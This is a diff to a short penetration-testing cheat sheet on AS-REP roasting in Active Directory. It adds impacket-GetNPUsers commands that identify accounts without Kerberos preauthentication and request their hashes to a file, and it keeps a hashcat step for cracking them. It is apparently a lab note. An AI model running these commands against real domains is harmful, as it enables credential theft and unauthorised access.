@@ -1,7 +1,10 @@
 "Do not require Kerberos preauthentication is disabled" by default.
 
-# From Kali:
-$ impacket-GetNPUsers -dc-ip 10.0.0.2  -request -outputfile hashes.asreproast superalex.sec/user01
+# Identify vuln users:
+$ impacket-GetNPUsers -dc-ip 10.0.0.2 superalex.sec/user01
+
+# Request and save for output:
+$ impacket-GetNPUsers -dc-ip 10.0.0.2 -request -outputfile hashes.asreproast superalex.sec/user01
 
 # Then check hashcat for kerberos:
 $ hashcat --help | grep -i "Kerberos"
